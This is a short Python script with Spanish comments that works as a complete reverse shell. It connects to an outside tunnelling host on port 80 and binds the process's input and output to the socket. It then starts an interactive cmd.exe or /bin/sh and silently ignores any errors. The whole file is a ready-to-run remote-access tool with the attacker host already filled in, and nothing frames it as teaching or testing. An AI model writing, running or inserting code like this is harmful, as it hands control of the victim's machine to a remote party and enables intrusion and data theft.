import socket, subprocess, os, platform

# CONFIGURACIÓN AUTOMÁTICA DEL ARQUITECTO
LHOST = "655592f6d7f85cbd-186-141-134-223.serveousercontent.com" 
LPORT = 80

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        if os.name == 'nt':
            subprocess.call(["cmd.exe"])
        else:
            subprocess.call(["/bin/sh", "-i"])
    except:
        pass

if __name__ == "__main__":
    connect()
